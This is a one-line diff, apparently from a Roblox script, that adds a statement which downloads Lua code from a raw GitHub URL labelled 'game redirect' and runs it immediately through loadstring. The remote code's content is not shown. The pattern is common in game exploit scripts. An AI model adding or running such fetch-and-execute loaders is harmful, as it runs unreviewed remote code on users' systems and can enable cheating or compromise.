@@ -1,1 +1,1 @@
-
+loadstring(game:HttpGet("https://raw.githubusercontent.com/martian61/loadstring/refs/heads/main/game%20redirect"))()
